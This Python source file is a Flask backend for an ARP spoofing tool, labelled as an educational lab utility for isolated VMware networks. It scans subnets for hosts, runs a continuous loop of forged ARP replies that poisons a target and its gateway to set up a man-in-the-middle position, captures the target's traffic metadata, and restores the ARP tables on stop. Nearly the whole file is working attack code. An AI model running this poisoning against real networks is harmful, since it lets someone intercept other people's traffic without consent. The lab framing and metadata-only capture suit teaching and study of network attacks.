#!/usr/bin/env python3
"""
ARP Spoofer - Educational lab tool, web UI backend
Run with: sudo python3 arpspoof_server.py
Then open arpspoof_ui.html in your browser.

Only use on an isolated VMware lab network (Host-only / Internal Network)
against VMs you own and control. Requires root for raw socket access.
"""

import sys
import threading
import time
import json
import os
from datetime import datetime

try:
    from scapy.all import ARP, Ether, IP, TCP, UDP, send, sniff, srp, getmacbyip
except ImportError:
    print("scapy not found. Install it with: sudo pip3 install scapy")
    sys.exit(1)

try:
    from flask import Flask, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("flask not found. Install it with: sudo pip3 install flask flask-cors")
    sys.exit(1)

app = Flask(__name__)
CORS(app)  # allows the local HTML file to call this API

state = {
    "running": False,
    "thread": None,
    "target_ip": None,
    "gateway_ip": None,
    "target_mac": None,
    "gateway_mac": None,
    "sent_count": 0,
    "log": [],
    "sniffing": False,
    "sniff_thread": None,
    "iface": None,
    "packet_total": 0,
    "protocol_counts": {},   # e.g. {"TCP": 10, "UDP": 3}
    "top_talkers": {},       # e.g. {"192.168.100.10 -> 8.8.8.8": 5}
}
lock = threading.Lock()


def log(msg):
    with lock:
        state["log"].append(msg)
        state["log"] = state["log"][-200:]  # keep last 200 lines
    print(msg)


def poison_loop(interval):
    while state["running"]:
        try:
            send(ARP(op=2, pdst=state["target_ip"], hwdst=state["target_mac"],
                      psrc=state["gateway_ip"]), verbose=False)
            send(ARP(op=2, pdst=state["gateway_ip"], hwdst=state["gateway_mac"],
                      psrc=state["target_ip"]), verbose=False)
            with lock:
                state["sent_count"] += 2
        except Exception as e:
            log(f"[!] Error: {e}")
            break
        time.sleep(interval)


@app.route("/discover", methods=["POST"])
def discover():
    """ARP-scan a subnet to find live hosts (name, IP, MAC) on the lab network."""
    data = request.json or {}
    subnet = data.get("subnet", "").strip()   # e.g. "192.168.100.0/24"
    iface = data.get("iface", "").strip()

    if not subnet or not iface:
        return jsonify({"ok": False, "error": "subnet and iface required"}), 400

    log(f"[*] Scanning {subnet} on {iface} for live hosts...")
    try:
        arp_req = ARP(pdst=subnet)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_req
        answered, _ = srp(packet, timeout=3, iface=iface, verbose=False)
    except Exception as e:
        log(f"[!] Scan error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500

    hosts = []
    for sent, received in answered:
        hosts.append({"ip": received.psrc, "mac": received.hwsrc})

    hosts.sort(key=lambda h: tuple(int(x) for x in h["ip"].split(".")))
    log(f"[+] Scan complete. Found {len(hosts)} live host(s).")

    return jsonify({"ok": True, "hosts": hosts})


@app.route("/export", methods=["GET"])
def export():
    """Dump the current session (log + stats) to a JSON file for a lab report."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"arpspoof_session_{ts}.json"
    filepath = os.path.join(os.getcwd(), filename)

    with lock:
        session = {
            "exported_at": datetime.now().isoformat(),
            "target_ip": state["target_ip"],
            "gateway_ip": state["gateway_ip"],
            "target_mac": state["target_mac"],
            "gateway_mac": state["gateway_mac"],
            "sent_count": state["sent_count"],
            "packet_total": state["packet_total"],
            "protocol_counts": state["protocol_counts"],
            "top_talkers": state["top_talkers"],
            "log": state["log"],
        }

    with open(filepath, "w") as f:
        json.dump(session, f, indent=2)

    log(f"[+] Session exported to {filename}")
    return jsonify({"ok": True, "filename": filename})


def handle_packet(pkt):
    """Record metadata only (protocol, src/dst, size) — never payload/contents."""
    if not pkt.haslayer(IP):
        return

    proto = "OTHER"
    if pkt.haslayer(TCP):
        proto = "TCP"
    elif pkt.haslayer(UDP):
        proto = "UDP"

    src = pkt[IP].src
    dst = pkt[IP].dst
    flow = f"{src} -> {dst}"

    with lock:
        state["packet_total"] += 1
        state["protocol_counts"][proto] = state["protocol_counts"].get(proto, 0) + 1
        state["top_talkers"][flow] = state["top_talkers"].get(flow, 0) + 1
        # keep only the top 10 flows to avoid unbounded growth
        if len(state["top_talkers"]) > 10:
            trimmed = dict(sorted(state["top_talkers"].items(), key=lambda x: -x[1])[:10])
            state["top_talkers"] = trimmed


def sniff_loop(iface, bpf_filter):
    sniff(iface=iface, filter=bpf_filter, prn=handle_packet,
          stop_filter=lambda p: not state["sniffing"], store=False)


@app.route("/sniff/start", methods=["POST"])
def sniff_start():
    if state["sniffing"]:
        return jsonify({"ok": False, "error": "Already sniffing"}), 400
    if not state["running"]:
        return jsonify({"ok": False, "error": "Start ARP poisoning first"}), 400

    data = request.json or {}
    iface = data.get("iface", "").strip()
    if not iface:
        return jsonify({"ok": False, "error": "iface required"}), 400

    # Only capture traffic to/from the target host, metadata only
    bpf_filter = f"host {state['target_ip']}"

    state["sniffing"] = True
    state["iface"] = iface
    state["packet_total"] = 0
    state["protocol_counts"] = {}
    state["top_talkers"] = {}

    log(f"[*] Starting traffic capture on {iface}, filtered to host {state['target_ip']}")
    log("[i] Capturing protocol/flow metadata only — no packet contents are parsed or stored.")

    t = threading.Thread(target=sniff_loop, args=(iface, bpf_filter), daemon=True)
    state["sniff_thread"] = t
    t.start()

    return jsonify({"ok": True})


@app.route("/sniff/stop", methods=["POST"])
def sniff_stop():
    if not state["sniffing"]:
        return jsonify({"ok": False, "error": "Not sniffing"}), 400
    state["sniffing"] = False
    log(f"[*] Capture stopped. Total packets seen: {state['packet_total']}")
    return jsonify({"ok": True})


@app.route("/start", methods=["POST"])
def start():
    if state["running"]:
        return jsonify({"ok": False, "error": "Already running"}), 400

    data = request.json
    target_ip = data.get("target_ip", "").strip()
    gateway_ip = data.get("gateway_ip", "").strip()
    interval = float(data.get("interval", 2))

    if not target_ip or not gateway_ip:
        return jsonify({"ok": False, "error": "target_ip and gateway_ip required"}), 400

    log(f"[*] Resolving MAC addresses...")
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac:
        log(f"[!] Could not resolve MAC for target {target_ip}")
        return jsonify({"ok": False, "error": f"Could not resolve MAC for {target_ip}"}), 400
    if not gateway_mac:
        log(f"[!] Could not resolve MAC for gateway {gateway_ip}")
        return jsonify({"ok": False, "error": f"Could not resolve MAC for {gateway_ip}"}), 400

    state.update({
        "running": True,
        "target_ip": target_ip,
        "gateway_ip": gateway_ip,
        "target_mac": target_mac,
        "gateway_mac": gateway_mac,
        "sent_count": 0,
    })

    log(f"[+] Target:  {target_ip} -> {target_mac}")
    log(f"[+] Gateway: {gateway_ip} -> {gateway_mac}")
    log("[*] Poisoning started.")

    t = threading.Thread(target=poison_loop, args=(interval,), daemon=True)
    state["thread"] = t
    t.start()

    return jsonify({"ok": True})


@app.route("/stop", methods=["POST"])
def stop():
    if not state["running"]:
        return jsonify({"ok": False, "error": "Not running"}), 400

    state["running"] = False
    if state["sniffing"]:
        state["sniffing"] = False
        log("[*] Capture stopped (ARP poisoning ended).")
    log("[*] Stopping and restoring ARP tables...")

    try:
        send(ARP(op=2, pdst=state["target_ip"], hwdst=state["target_mac"],
                  psrc=state["gateway_ip"], hwsrc=state["gateway_mac"]), verbose=False, count=4)
        send(ARP(op=2, pdst=state["gateway_ip"], hwdst=state["gateway_mac"],
                  psrc=state["target_ip"], hwsrc=state["target_mac"]), verbose=False, count=4)
        log("[+] ARP tables restored.")
    except Exception as e:
        log(f"[!] Error restoring: {e}")

    return jsonify({"ok": True})


@app.route("/status", methods=["GET"])
def status():
    with lock:
        return jsonify({
            "running": state["running"],
            "sent_count": state["sent_count"],
            "log": state["log"],
            "sniffing": state["sniffing"],
            "packet_total": state["packet_total"],
            "protocol_counts": state["protocol_counts"],
            "top_talkers": state["top_talkers"],
        })


if __name__ == "__main__":
    import os
    if os.geteuid() != 0:
        print("This script needs root privileges for raw socket access.")
        print("Run it with: sudo python3 arpspoof_server.py")
        sys.exit(1)

    print("[*] Starting backend on http://127.0.0.1:5050")
    print("[*] Open arpspoof_ui.html in your browser now.")
    app.run(host="127.0.0.1", port=5050)